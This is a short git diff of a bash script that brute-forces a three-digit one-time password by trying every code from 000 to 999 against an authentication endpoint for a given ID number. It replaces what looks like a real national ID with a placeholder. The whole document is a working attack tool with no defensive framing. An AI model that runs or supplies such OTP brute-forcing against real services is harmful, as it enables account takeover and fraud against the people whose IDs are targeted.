@@ -1,6 +1,6 @@
 #!/bin/bash
 
-nid="784-1978-8264760-1"
+nid="any_valid_nid"
 
 for otp in $(seq -w 000 999); do
   echo "[-] Trying OTP: $otp"
@@ -10,9 +10,11 @@ for otp in $(seq -w 000 999); do
     -d "{\"nid\":\"$nid\",\"otp\":\"$otp\"}")
 
   if [[ $response == *'"result":true'* ]]; then
-    echo "[+] ✅ SUCCESS! OTP is $otp"
+    echo "[+]  SUCCESS! OTP is $otp"
     echo "Response: $response"
     break
   fi
 done
+
+#since this was a three digits otp that's why it didn't much code
 
